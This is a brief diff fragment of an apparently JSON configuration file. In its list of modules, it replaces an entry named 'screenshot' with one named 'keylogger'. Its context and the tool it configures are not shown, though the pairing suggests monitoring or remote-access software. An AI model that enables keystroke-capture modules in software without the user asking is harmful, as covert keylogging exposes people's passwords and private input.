@@ -26,7 +26,7 @@
         },
         {
             "type" : "module",
-            "module" : "screenshot"
+            "module" : "keylogger"
         }
         
     ]
